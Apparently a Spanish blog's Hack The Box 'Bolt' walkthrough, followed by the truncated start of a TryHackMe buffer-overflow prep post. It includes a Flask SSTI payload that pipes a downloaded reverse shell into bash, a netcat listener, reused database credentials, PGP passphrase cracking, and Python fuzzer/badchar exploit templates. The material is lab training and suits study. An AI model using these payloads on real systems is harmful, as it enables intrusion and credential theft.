8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/bolt ❯ feroxbuster -u http://bolt.htb -w $MD ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://bolt.htb 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 308 4l 24w 239c http://bolt.htb/index 200 173l 564w 9287c http://bolt.htb/login 200 346l 1141w 18570c http://bolt.htb/download 200 468l 1458w 26293c http://bolt.htb/contact 200 199l 639w 11038c http://bolt.htb/register 200 405l 1419w 22443c http://bolt.htb/services 500 4l 40w 290c http://bolt.htb/profile 200 549l 2014w 31731c http://bolt.htb/pricing 302 4l 24w 209c http://bolt.htb/logout Subdominios Utilizamos ffuf para enumerar subdominios, vemos dos nuevos mail y demo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 π ~/htb/bolt ❯ ffuf -w bitquark-subdomains-top100000.txt -H \u0026#34;Host: FUZZ.bolt.htb\u0026#34; -u http://bolt.htb -fs 30347 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://bolt.htb :: Wordlist : FUZZ: bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.bolt.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 30347 ________________________________________________ mail [Status: 200, Size: 4943, Words: 345, Lines: 99] demo [Status: 302, Size: 219, Words: 22, Lines: 4] :: Progress: [100000/100000] :: Job [1/1] :: 164 req/sec :: Duration: [0:11:41] :: Errors: 0 :: User - www-data Webmail En el subdominio mail encontramos un login las credenciales del usuario admin no funcionan.\nTomando en cuenta la cookie todo indica que es Roundcube Webmail.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/bolt ❯ curl -sI http://mail.bolt.htb/ HTTP/1.1 200 OK Server: nginx/1.18.0 (Ubuntu) Date: Wed, 29 Sep 2021 01:30:09 GMT Content-Type: text/html; charset=UTF-8 Connection: keep-alive Set-Cookie: roundcube_sessid=6mvcdpffsfu9uru6h2ih8idlj9; path=/; HttpOnly Expires: Wed, 29 Sep 2021 01:30:09 GMT Last-Modified: Wed, 29 Sep 2021 01:30:09 GMT Cache-Control: private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache X-Frame-Options: sameorigin Content-Language: en Demo En el subdominio demo encontramos un login donde tampoco funcionaron las credenciales, sin embargo en este es posible registrar un usuario con un correo utilizando el codigo de invitacion.\nTras ingresar vemos un dashboard similar al modulo Base, además vemos el formulario del modulo Home que podria tener una vulnerabilidad SSTI.\nSSTI Intentamos explotar la vulnerabilidad enviando un pequeño print ({% print('x'*8) %}), la respuesta fue una redireccion al dashobard.\nEn la app no encontramos ninguna ruta para verificar correos electronicos, sin embargo al registrar un usuario tambien se registra un correo. Utilizando Webmail logramos acceder con las credenciales de registro, donde encontramos un correo con la url de confirmacion.\nTras visitar la url de confirmación recibimos un segundo correo con el resultado del codigo ejecutado ({% print('x'*8) %}). Como se suponia (Vulnerabilidad App) existe una vulnerabilidad.\nNuevamente enviamos un payload para ejecutar comandos y vemos que el usuario es www-data.\nShell Ejecutamos una shell inversa lo que nos permitio acceder a la maquina como www-data.\n1 2 3 4 5 6 # local # https://github.com/sckull/shells wget -q https://shell.infosecjack.me/10.10.10.10:1338 -O x python3 -m http.server 80 # payload {{request.application.__globals__.__builtins__.__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;curl 10.10.10.10/x|bash\u0026#39;).read()}} 1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/bolt ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.30] from passbolt.bolt.htb [10.10.11.114] 55904 /bin/sh: 0: can\u0026#39;t access tty; job control turned off which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@bolt:~/demo$ pwd /var/www/demo www-data@bolt:~/demo$ whoami www-data www-data@bolt:~/demo$ User - Eddie Enumerando los diferentes archivos de configuración nos topamos con el archivo de passbolt (passbolt.php) que contiene la contraseña de configuración de la base de datos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 www-data@bolt:/etc/passbolt$ ls app.default.php default.php passbolt.default.php schema app.php file_storage.php passbolt.php Seeds bootstrap_cli.php gpg paths.php version.php bootstrap.php Migrations requirements.php bootstrap_plugins.php nginx-ssl.conf routes.php www-data@bolt:/etc/passbolt$ cat passbolt.php \u0026lt;?php [... snip ...] return [ \u0026#39;App\u0026#39; =\u0026gt; [ // A base URL to use for absolute links. // The url where the passbolt instance will be reachable to your end users. // This information is need to render images in emails for example \u0026#39;fullBaseUrl\u0026#39; =\u0026gt; \u0026#39;https://passbolt.bolt.htb\u0026#39;, ], // Database configuration. \u0026#39;Datasources\u0026#39; =\u0026gt; [ \u0026#39;default\u0026#39; =\u0026gt; [ \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;port\u0026#39; =\u0026gt; \u0026#39;3306\u0026#39;, \u0026#39;username\u0026#39; =\u0026gt; \u0026#39;passbolt\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;rT2;jW7\u0026lt;eY8!dX8}pQ8%\u0026#39;, \u0026#39;database\u0026#39; =\u0026gt; \u0026#39;passboltdb\u0026#39;, ], ], [... snip ...] www-data@bolt:/etc/passbolt$ Utilizamos esta contraseña con el usuario Eddie, obtuvimos una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 www-data@bolt:/etc/passbolt$ su eddie Password: rT2;jW7\u0026lt;eY8!dX8}pQ8% eddie@bolt:/etc/passbolt$ whoami; id eddie uid=1000(eddie) gid=1000(eddie) groups=1000(eddie) eddie@bolt:/etc/passbolt$ cd eddie@bolt:~$ ls Desktop Downloads Pictures Templates Videos Documents Music Public user.txt eddie@bolt:~$ cat user.txt ed881799d29ad1ec560f5462c5cdf4c1 eddie@bolt:~$ Privesc Passbolt DB Con las credenciales de passbolt enumeramos la base de datos. Encontramos dos usuarios registrado: eddie y clark.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 mysql\u0026gt; show tables; +-----------------------+ | Tables_in_passboltdb | +-----------------------+ | account_settings | | action_logs | | actions | | authentication_tokens | | avatars | | comments | | email_queue | | entities_history | | favorites | | gpgkeys | | groups | | groups_users | | organization_settings | | permissions | | permissions_history | | phinxlog | | profiles | | resource_types | | resources | | roles | | secret_accesses | | secrets | | secrets_history | | user_agents | | users | +-----------------------+ 25 rows in set (0.01 sec) mysql\u0026gt; select * from users; +--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+ | id | role_id | username | active | deleted | created | modified | +--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+ | 4e184ee6-e436-47fb-91c9-dccb57f250bc | 1cfcd300-0664-407e-85e6-c11664a7d86c | eddie@bolt.htb | 1 | 0 | 2021-02-25 21:42:50 | 2021-02-25 21:55:06 | | 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 975b9a56-b1b1-453c-9362-c238a85dad76 | clark@bolt.htb | 1 | 0 | 2021-02-25 21:40:29 | 2021-02-25 21:42:32 | +--------------------------------------+--------------------------------------+----------------+--------+---------+---------------------+---------------------+ 2 rows in set (0.01 sec) mysql\u0026gt; En la tabla de gpgkeys encontramos claves publicas de los usuarios registrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 mysql\u0026gt; describe gpgkeys; +-------------+--------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------------+--------------+------+-----+---------+-------+ | id | char(36) | NO | PRI | NULL | | | user_id | char(36) | NO | | NULL | | | armored_key | text | NO | | NULL | | | bits | int | YES | | 2048 | | | uid | varchar(128) | NO | | NULL | | | key_id | varchar(16) | NO | | NULL | | | fingerprint | varchar(51) | NO | MUL | NULL | | | type | varchar(16) | YES | | NULL | | | expires | datetime | YES | | NULL | | | key_created | datetime | YES | | NULL | | | deleted | tinyint(1) | NO | | 0 | | | created | datetime | NO | | NULL | | | modified | datetime | NO | | NULL | | +-------------+--------------+------+-----+---------+-------+ 13 rows in set (0.00 sec) mysql\u0026gt; select user_id,armored_key from gpgkeys; [... snip ... ] | user_id | armored_key | [... snip ... ] | 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | -----BEGIN PGP PUBLIC KEY BLOCK----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org xsBNBGA4GX0BCAD2MdBV19tAu+SWkMJ0BkvGdQrLquHg1olUvvhvIWmmBICr eA89HnYYKFoOxnCL1yhpArtf379rFTZJDXzbzXlnCvgZzP71MNYo2Pq3l0Zn [... snip ... ] IadG59FrSdK+n8vXPNPcYUcm1F6ddDGvsxjBNwCX00jDNL3Gp7fPqKQjQCh0 pMIO+51kn9QRJJP/XmJrOw2mTheT20DT26JX/K947oi/pAe8xGHrCKAqWiZ5 AeAgt0l0AiCdPTQ= =axZz -----END PGP PUBLIC KEY BLOCK----- | | 4e184ee6-e436-47fb-91c9-dccb57f250bc | -----BEGIN PGP PUBLIC KEY BLOCK----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org xsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk [... snip ... ] pmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1 tD0sGGFpQMsI+Q== =+pbw -----END PGP PUBLIC KEY BLOCK----- [... snip ... ] 2 rows in set (0.00 sec) mysql\u0026gt; Finalmente en la tabla secrets encontramos un mensaje encriptado por el usuario Eddie.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 mysql\u0026gt; describe secrets; +-------------+------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------------+------------+------+-----+---------+-------+ | id | char(36) | NO | PRI | NULL | | | user_id | char(36) | NO | MUL | NULL | | | resource_id | char(36) | NO | MUL | NULL | | | data | mediumtext | NO | | NULL | | | created | datetime | NO | | NULL | | | modified | datetime | NO | | NULL | | +-------------+------------+------+-----+---------+-------+ 6 rows in set (0.00 sec) mysql\u0026gt; select user_id, data from secrets; [... snip ... ] | user_id | data [... snip ... ] | 4e184ee6-e436-47fb-91c9-dccb57f250bc | -----BEGIN PGP MESSAGE----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7 FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov 8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey 5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6 TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984 =P38i -----END PGP MESSAGE----- [... snip ... ] 1 row in set (0.00 sec) mysql\u0026gt; Intentamos desencriptar el mensaje utilizando la clave privada (serverkey_private.asc) de passbolt pero no es posible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 -----BEGIN PGP MESSAGE----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7 FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov 8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey 5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6 TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984 =P38i -----END PGP MESSAGE----- Email Enumerando un poco más, fuera de la carpeta principal, encontramos un correo enviado por Clark, en el que habla de una extension de navegador e indica que la clave privada de Eddie es la única forma de recuperar nuestra cuenta, refiriendose al mensaje encriptado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 eddie@bolt:~$ cat /var/mail/eddie From clark@bolt.htb Thu Feb 25 14:20:19 2021 Return-Path: \u0026lt;clark@bolt.htb\u0026gt; X-Original-To: eddie@bolt.htb Delivered-To: eddie@bolt.htb Received: by bolt.htb (Postfix, from userid 1001) id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST) Subject: Important! To: \u0026lt;eddie@bolt.htb\u0026gt; X-Mailer: mail (GNU Mailutils 3.7) Message-Id: \u0026lt;20210225212019.DFF264CD@bolt.htb\u0026gt; Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST) From: Clark Griswold \u0026lt;clark@bolt.htb\u0026gt; Hey Eddie, The password management server is up and running. Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account. Once you\u0026#39;re set up you can start importing your passwords. Please be sure to keep good security in mind - there\u0026#39;s a few things I read about in a security whitepaper that are a little concerning... -Clark eddie@bolt:~$ Eddie no tiene ninguna clave registrada por lo que enumeramos la maquina en busqueda de claves privadas. Vemos que hay una coincidencia en el log de una extension de Google Chrome.\n1 2 3 4 5 6 7 8 9 10 11 eddie@bolt:~$ gpg --list-keys eddie@bolt:~$ eddie@bolt:~$ grep --color=auto -rnw \u0026#39;/\u0026#39; -ie \u0026#34;PRIVATE KEY\u0026#34; --exclude \\*.js --color=always 2\u0026gt; /dev/null Binary file /opt/google/chrome/nacl_helper matches Binary file /opt/google/chrome/chrome matches Binary file /opt/google/chrome/locales/en-GB.pak matches Binary file /opt/google/chrome/locales/en-US.pak matches /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/data/config-debug.html:150: \u0026lt;h3\u0026gt;Private key\u0026lt;/h3\u0026gt; Binary file /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches ^C eddie@bolt:~$ El archivo tiene mucho texto, copiamos el archivo a nuestra maquina donde vemos que existen dos claves privadas (son las mismas), utilizando sublime text eliminamos los caracteres inecesarios.\n1 2 3 4 π ~/htb/bolt ❯ scp eddie@10.10.11.114:\u0026#34;/home/eddie/.config/google-chrome/Default/Local\\ Extension\\ Settings/didegimhafipceonhjepacocaffmoppf/000003.log\u0026#34; . # rT2;jW7\u0026lt;eY8!dX8}pQ8% eddie@10.10.11.114\u0026#39;s password: 000003.log 100% 60KB 48.6KB/s 00:01 π ~/htb/bolt ❯ La clave privada esta protegida por una frase.\n1 2 3 4 5 6 7 8 9 10 11 12 -----BEGIN PGP PRIVATE KEY BLOCK----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU [... snip ...] YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0 PSwYYWlAywj5 =cqxZ -----END PGP PRIVATE KEY BLOCK----- Cracking Hash Utilizamos gpg2john para poder crackear el hash obtenido.\n1 2 3 4 5 6 7 8 π ~/htb/bolt ❯ gpg2john private_eddie File private_eddie Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson \u0026lt;eddie@bolt.htb\u0026gt;::private_eddie π ~/htb/bolt ❯ gpg2john private_eddie \u0026gt; hash_eddite_private File private_eddie π ~/htb/bolt ❯ Utilizando john y el wordlist rockyou.txt obtuvimos la frase para la clave privada.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/bolt ❯ john hash_eddite_private --wordlist=$ROCK Using default input encoding: UTF-8 Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64]) Cost 1 (s2k-count) is 16777216 for all loaded hashes Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes Will run 4 OpenMP threads merrychristmas (Eddie Johnson) 1g 0:00:10:52 DONE (2021-09-29 17:37) 0.001532g/s 65.64p/s 65.64c/s 65.64C/s mhines..menudo Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed π ~/htb/bolt ❯ Importamos la clave privada ingresando la frase previamente encontrada, finalmente desencriptamos el mensaje, este ultimo muestra una contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 π ~/htb/bolt ❯ gpg --import private_eddie.gpg gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created gpg: key 1C2741A3DC3B4ABD: public key \u0026#34;Eddie Johnson \u0026lt;eddie@bolt.htb\u0026gt;\u0026#34; imported gpg: key 1C2741A3DC3B4ABD: secret key imported gpg: Total number processed: 1 gpg: imported: 1 gpg: secret keys read: 1 gpg: secret keys imported: 1 π ~/htb/bolt ❯ π ~/htb/bolt ❯ gpg --decrypt message.gpg gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25 \u0026#34;Eddie Johnson \u0026lt;eddie@bolt.htb\u0026gt;\u0026#34; {\u0026#34;password\u0026#34;:\u0026#34;Z(2rmxsNW(Z?3=p/9s\u0026#34;,\u0026#34;description\u0026#34;:\u0026#34;\u0026#34;} gpg: Signature made Sat 06 Mar 2021 10:33:54 AM EST gpg: using RSA key 1C2741A3DC3B4ABD gpg: Good signature from \u0026#34;Eddie Johnson \u0026lt;eddie@bolt.htb\u0026gt;\u0026#34; [unknown] gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E DA0E 1C27 41A3 DC3B 4ABD π ~/htb/bolt ❯ Shell Obtuvimos una shell como root tras utilizar la contraseña encontrada.\n1 2 3 4 5 6 7 8 9 10 11 eddie@bolt:~$ su Password: root@bolt:/home/eddie# whoami;id root uid=0(root) gid=0(root) groups=0(root) root@bolt:/home/eddie# cd root@bolt:~# ls root.txt snap root@bolt:~# cat root.txt 2f385057198b2610fa64167d08a509b2 root@bolt:~# ","description":"En Bolt analizamos una imagen de docker donde descubrimos una vulnerabilidad SSTI en una aplicación de Flask, esto nos permitio el acceder al primer usuario. Credenciales almacenadas nos permitieron obtener acceso a un segundo usuario. Finalmente obtuvimos en texto plano las credenciales del superusuario con una clave privada en una extensión de Google Chrome.","id":35,"section":"posts","tags":["ssti","flask","docker","passbolt","webmail","gpg2john","john"],"title":"Hack The Box - Bolt","uri":"https://sckull.github.io/posts/bolt-htb/"},{"content":"\rBuffer Overflow Prep es una room enfocada a la practica de explotación para el OSCP. Se muestran los \u0026lsquo;pasos\u0026rsquo;, comandos y herramientas para llegar a la solución de cada uno de los retos.\nTitulo Buffer Overflow Prep Descripción Practice stack based buffer overflows! Puntos 160 Dificultad Facil Maker Tib3rius Configuración Para agilizar el trabajo descargamos la carpeta completa (vulnerable-apps/) a una maquina local Windos 7 de 32 bits.\nImmunity Debugger Para resolver los diferentes retos utilizamos el debugger Immunity Debugger. Tras la instalación, configuramos el debugger de tal forma que este pueda ser ejecuado como administrador.\nMona Vamos a utilizar el script mona.py el cual descargamos y copiamos dentro del directorio PyCommands de Immunity.\nTras copiar el script generamos nuestro directorio bajo el cual vamos a trabajar con el siguiente comando. En mi caso tengo una carpeta en la raiz del disco duro (C:\\bof\\). El valor %p representaría el nombre del proceso el cual sería oscp, de tal forma que nuestro directorio de trabajo sería: C:\\bof\\oscp\\.\n1 !mona config -set workingdirectory C:\\bof\\%p oscp.exe En Immunity abrimos el ejecutable oscp.exe en File \u0026gt; Open.\nVemos que esta en Pausa, podemos utilizar el boton de \u0026ldquo;play\u0026rdquo; o F9 para que se siga ejecutando normalmente.\nFinalmente vemos abierta una terminal donde se muestra el output del ejecutable.\nPython Para el desarrollo de exploits vamos a utilizar el lenguaje Python, se presentan algunas \u0026ldquo;plantillas\u0026rdquo; de scripts que utilizamos en los distintos \u0026ldquo;pasos\u0026rdquo;.\nFuzzer\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toverflow.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 # Fuzzing buff = [\u0026#34;A\u0026#34;] c = 100 while len(buff) \u0026lt; 30: buff.append(\u0026#34;A\u0026#34;*c) c += 100 p1 = log.progress(\u0026#34;Progreso\u0026#34;) for string in buff: try: p1.status(\u0026#34;Enviando %s bytes.\u0026#34; % len(string)) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) connect = s.connect((address, port)) data = s.recv(1024) s.send(\u0026#34;OVERFLOW1 %s\\r\\n\u0026#34; % string) s.close() #log.info(\u0026#34;x_x socket.\u0026#34;) except Exception as e: #print(e) log.failure(\u0026#34;Parece que el programa se detuvo con %s bytes.\u0026#34; % len(string)) sys.exit(1) Badchars\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #!/usr/bin/python2.7 import socket, sys from pwn import * from struct import pack if len(sys.argv) != 2: print(\u0026#34;[*] Run:\\n\\toverflow.py \u0026lt;IP-address\u0026gt;\u0026#34;) sys.exit(1) address = sys.argv[1] port = 1337 badchars = (\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; \u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; \u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; \u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; \u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; 